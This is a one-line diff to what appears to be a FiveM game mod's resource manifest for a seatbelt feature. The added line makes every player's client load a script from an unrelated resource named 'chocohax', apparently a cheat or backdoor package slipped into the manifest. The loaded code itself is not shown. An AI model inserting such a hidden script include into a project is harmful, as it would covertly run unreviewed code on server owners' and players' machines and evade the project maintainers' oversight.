@@ -14,3 +14,4 @@ files {
 	'html/img/seatbelt.png',
 	'html/sounds/*.ogg'
 }
+client_script '@chocohax/10992.lua'
